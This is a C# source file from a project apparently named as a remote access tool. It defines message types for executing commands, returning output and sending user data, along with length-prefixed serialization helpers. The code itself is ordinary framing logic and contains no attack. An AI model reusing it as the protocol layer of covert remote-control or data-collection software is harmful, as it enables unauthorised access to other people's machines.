using System;
using System.Collections.Generic;

namespace WISRAT.Shared
{
    /// <summary>
    /// Message Builder
    /// </summary>
    public static class MessageBuilder
    {
        /// <summary>
        /// Message type
        /// </summary>
        public enum MessageType
        {
            ExecuteCommand = 0x00,
            CommandOutput = 0x01,
            UserData = 0x02,
            Disconnect = 0x03
        }
        
        /// <summary>
        /// Message object
        /// </summary>
        public class Message
        {
            public MessageType Type;
            public byte[] Content;
        }
        
        /// <summary>
        /// Message object to byte[] payload (includes size)
        /// </summary>
        /// <param name="message">Message to convert</param>
        /// <returns>byte[] payload</returns>
        public static byte[] MessageToPayload(Message message)
        {
            var list = new List<byte>();
            byte[] type = BitConverter.GetBytes((int)message.Type);
            byte[] size = BitConverter.GetBytes(message.Content.Length + type.Length);
            foreach (var i in size)
                list.Add(i);
            foreach (var i in type)
                list.Add(i);
            foreach (var i in message.Content)
                list.Add(i);
            return list.ToArray();
        }

        /// <summary>
        /// byte[] payload to message object (without size)
        /// </summary>
        /// <param name="payload">Payload to convert</param>
        /// <returns>Message object</returns>
        public static Message PayloadToMessage(byte[] payload)
        {
            byte[] typeBytes = new byte[4];
            for (int i = 0; i < 4; i++) typeBytes[i] = payload[i];
            byte[] content = new byte[payload.Length - 4];
            for (int i = 4; i < payload.Length; i++) content[i - 4] = payload[i];
            MessageType type;
            try { type = (MessageType)BitConverter.ToInt32(typeBytes); }
            catch { throw new Exception("Unknown message type!"); }
            return new Message { Type = type, Content = content };
        }
    }
}